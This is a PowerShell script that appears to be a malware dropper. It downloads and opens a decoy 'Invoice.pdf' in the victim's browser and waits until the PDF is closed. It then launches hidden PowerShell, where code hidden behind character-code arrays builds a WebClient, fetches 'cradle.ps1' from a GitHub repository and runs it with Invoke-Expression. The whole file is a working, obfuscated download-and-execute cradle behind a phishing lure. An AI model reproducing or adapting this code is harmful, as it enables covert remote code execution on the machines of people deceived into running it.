$pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
$pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"

$browserPaths = @(
    "C:\Program Files\Google\Chrome\Application\chrome.exe",
    "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files\Opera\opera.exe",
    "C:\Program Files\Opera GX\opera.exe",
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "C:\Program Files\Mozilla Firefox\firefox.exe"
)

$browserProcessNames = @(
    "chrome",
    "brave",
    "opera",
    "msedge",
    "firefox"
)

Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -ErrorAction SilentlyContinue

$browser = $browserPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($browser) {
    Start-Process -FilePath $browser -ArgumentList "`"$pdfPath`"" -ErrorAction SilentlyContinue
} else {
    Start-Process $pdfPath -ErrorAction SilentlyContinue
}

function Get-PDFRenderer {
    $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    $procs | Where-Object {
        $name = $_.Name -replace "\.exe$", ""
        ($browserProcessNames -contains $name) -and
        ($_.CommandLine -match "\.pdf")
    } | Select-Object ProcessId, Name, CommandLine
}

do {
    $pdfProcesses = Get-PDFRenderer
    if ($pdfProcesses) {
        Start-Sleep -Seconds 20
    }
} while ($pdfProcesses)

powershell -NoP -sta -NonI -W Hidden -enc
$OZ = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_}) $([char](0+83-0)+[char](69*121/69)+[char](97+115-97)+[char](58+116-58)+[char](55+101-55)+[char](0+109-0)+[char](0+46-0)+[char](78*78/78)+[char](96+101-96)+[char](22*116/22)+[char](15*46/15)+[char](7*87/7)+[char](102*101/102)+[char](0+98-0)+[char](0+67-0)+[char](39+108-39)+[char](71+105-71)+[char](62+101-62)+[char](55*110/55)+[char](94*116/94)); $qYWp7xlrTLRFeb91AP = ([string]::join('', ( (104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,66,114,111,116,104,101,114,115,101,120,116,114,101,109,101,103,97,109,105,110,103,47,112,119,115,104,99,114,97,100,108,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,99,114,97,100,108,101,46,112,115,49) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_}); $OZ.DownloadString($qYWp7xlrTLRFeb91AP) |%{$_}|ForEach-Object{$_}| & ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_})

